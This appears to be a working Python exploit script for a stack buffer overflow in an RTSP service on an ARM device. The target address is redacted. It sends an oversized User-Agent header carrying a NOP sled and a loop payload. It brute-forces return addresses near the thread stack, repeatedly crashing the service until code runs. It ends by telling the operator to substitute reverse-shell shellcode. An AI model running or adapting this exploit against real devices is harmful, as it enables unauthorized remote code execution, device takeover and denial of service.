#!/usr/bin/env python3
"""
rtsp_stack_rce.py — Targeted RCE: jump to thread stack near 0x40F40000

INSIGHT:
  Phase 2 tested 0x40300000–0x40800000 (library region) → all HIT
  Thread stack TOP = 0x40F40000 (kernel panic boundary from lr_region.py)
  Stack grows DOWN → buffer is at 0x40F3Fxxx

  We spray: NOP×61 + ARM_LOOP into User-Agent (248 bytes)
  Then jump to the stack address where the buffer sits.
  DEAD (no restart in 90s) = loop running = RCE!

Usage: python3 -u rtsp_stack_rce.py 2>&1 | tee /tmp/stack_rce_out.txt
"""

import socket, time, struct, sys

TARGET    = "█████████████"
RTSP_PORT = 554
PC_OFFSET = 248

ARM_NOP   = b'\x01\x10\xa0\xe1'   # MOV R1, R1
ARM_LOOP  = b'\xfe\xff\xff\xea'   # B . (infinite loop)

NOP_SLED_LEN = (PC_OFFSET - 4) // 4   # 61
LOOP_PAYLOAD = ARM_NOP * NOP_SLED_LEN + ARM_LOOP  # 248 bytes

assert len(LOOP_PAYLOAD) == PC_OFFSET

STACK_TOP = 0x40F40000  # confirmed: kernel panic starts here

# Thread stack is just below STACK_TOP.
# Test from just-below-top downward in small steps.
# Also test coarser steps further down (in case stack is large).
CANDIDATES = []

# Fine-grained: just below stack top (stack depth 0–8KB)
for step in range(0, 0x2000, 0x40):
    CANDIDATES.append(STACK_TOP - step)

# Medium: 8KB–64KB below top (deeper stack usage)
for step in range(0x2000, 0x10000, 0x400):
    CANDIDATES.append(STACK_TOP - step)

# Coarse: 64KB–256KB below top (very deep stack / large frames)
for step in range(0x10000, 0x40000, 0x2000):
    CANDIDATES.append(STACK_TOP - step)

# De-dupe, keep in order from near-top to far
seen = set()
FINAL = []
for a in CANDIDATES:
    if a not in seen and a > 0x40F00000:
        seen.add(a)
        FINAL.append(a)

print(f"Candidates to test: {len(FINAL)}")
print(f"Range: 0x{FINAL[-1]:08x} – 0x{FINAL[0]:08x}")


def rtsp_alive(timeout=5):
    try:
        s = socket.socket(); s.settimeout(timeout)
        s.connect((TARGET, RTSP_PORT))
        s.sendall(b"OPTIONS rtsp://" + TARGET.encode() + b":554/ RTSP/1.0\r\nCSeq:1\r\n\r\n")
        d = b""
        try: d = s.recv(256)
        except: pass
        s.close()
        return b"RTSP" in d
    except:
        return False

def wait_rtsp(max_wait=60, label=""):
    t0 = time.time()
    while time.time() - t0 < max_wait:
        if rtsp_alive():
            e = time.time() - t0
            if e > 2:
                print(f"  [✓] RTSP alive ({label}) — waited {e:.0f}s", flush=True)
            return True
        time.sleep(1.5)
    print(f"  [✗] RTSP dead {max_wait}s ({label})", flush=True)
    return False

def fmt(t):
    return "None" if t is None else f"{t:.1f}s"

def probe(ua_payload, label="", poll_timeout=90):
    if not wait_rtsp(120, "pre"):
        return None, "SKIP"
    req = (b"DESCRIBE rtsp://" + TARGET.encode() + b":554/live RTSP/1.0\r\n"
           b"CSeq: 1\r\nUser-Agent: " + ua_payload + b"\r\n\r\n")
    t0 = time.time()
    try:
        s = socket.socket(); s.settimeout(8)
        s.connect((TARGET, RTSP_PORT)); s.sendall(req)
        try: s.recv(256)
        except: pass
        s.close()
    except: pass

    PROBE = b"OPTIONS rtsp://" + TARGET.encode() + b":554/ RTSP/1.0\r\nCSeq:99\r\n\r\n"
    deadline = t0 + poll_timeout
    while time.time() < deadline:
        time.sleep(0.4)
        try:
            s2 = socket.socket(); s2.settimeout(3)
            s2.connect((TARGET, RTSP_PORT))
            s2.sendall(PROBE)
            d = b""
            try: d = s2.recv(256)
            except: pass
            s2.close()
            if b"RTSP" in d:
                t = time.time() - t0
                tag = "FAST" if t < 4 else ("HIT" if t < 70 else "PANIC")
                print(f"  [★] {label}  T+{t:.1f}s [{tag}]", flush=True)
                return t, tag
        except: pass
    t = time.time() - t0
    print(f"  [DEAD] {label}  T+{t:.0f}s ← LOOP RUNNING! ***", flush=True)
    return t, "DEAD"


print("=" * 60)
print("RTSP stack RCE — targeted near 0x40F40000")
print(f"  LOOP_PAYLOAD: {len(LOOP_PAYLOAD)}B  NOP×{NOP_SLED_LEN} + LOOP")
print("  DEAD = shellcode running → RCE!")
print("=" * 60)

wait_rtsp(120, "start")

for addr in FINAL:
    label = f"PC=0x{addr:08x}"
    payload = LOOP_PAYLOAD + struct.pack('<I', addr)
    t, tag = probe(payload, label, poll_timeout=90)
    print(f"  {label}: {fmt(t)} {tag}", flush=True)

    if tag == "DEAD":
        print(f"\n*** RCE CONFIRMED at 0x{addr:08x}! ***", flush=True)
        print("Shellcode (NOP sled + infinite loop) is executing.")
        print(f"Buffer is at 0x{addr:08x} on the thread stack.")
        print()
        print("Next: replace LOOP with reverse shell shellcode and re-run.")
        break
    elif tag in ("SKIP", "PANIC"):
        print(f"  Skipping after {tag}, waiting for recovery...", flush=True)
        wait_rtsp(120, "recovery")

print()
print("Done.")
